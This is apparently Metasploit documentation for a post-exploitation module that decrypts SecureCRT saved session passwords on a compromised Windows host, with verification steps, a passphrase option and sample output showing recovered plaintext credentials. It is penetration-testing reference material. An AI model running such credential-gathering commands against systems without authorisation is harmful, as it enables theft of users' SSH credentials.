## Vulnerable Application

This module can decrypt the SecureCRT, If the user chooses to remember the password.

  Analysis of encryption algorithm [here](https://github.com/HyperSine/how-does-SecureCRT-encrypt-password).

  You can find its official website [here](https://vandyke.com/).

## Verification Steps

  1. Download the latest installer of SecureCRT.
  2. Use SecureCRT to login to ssh.
  3. Remember to save the account password.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: ```run post/windows/gather/credentials/securecrt```
  6. If the session file is saved in the system, the host, port, user name and plaintext password will be printed.

## Options

 **Passphrase**

  - Specify user's master password, e.g.:123456'

## Scenarios

```
[*] Gather Securecrt Passwords on WIN-LHC82CUIV7U
[*] Search session files on C:\Users\Administrator\AppData\Roaming\VanDyke\Config\Sessions
[-] Maybe the user has set the passphrase, please try to provide the [Passphrase] to decrypt again.
Securecrt Password
==================

Filename          Hostname      Port  Username   Password
--------          --------      ----  --------   --------
192.168.56.1.ini  192.168.56.1  22    kali-team  

[+] Passwords stored in: /home/kali-team/.msf4/loot/20200911115103_default_10.0.2.15_host.securecrt_p_489607.txt

```

* Specify **Passphrase**

```
meterpreter > run post/windows/gather/credentials/securecrt Passphrase=123456

[*] Gather Securecrt Passwords on WIN-LHC82CUIV7U
[*] Search session files on C:\Users\Administrator\AppData\Roaming\VanDyke\Config\Sessions
Securecrt Password
==================

Filename          Hostname      Port  Username   Password
--------          --------      ----  --------   --------
192.168.56.1.ini  192.168.56.1  22    kali-team  123456789

[+] Passwords stored in: /home/kali-team/.msf4/loot/20200911115118_default_10.0.2.15_host.securecrt_p_954887.txt

```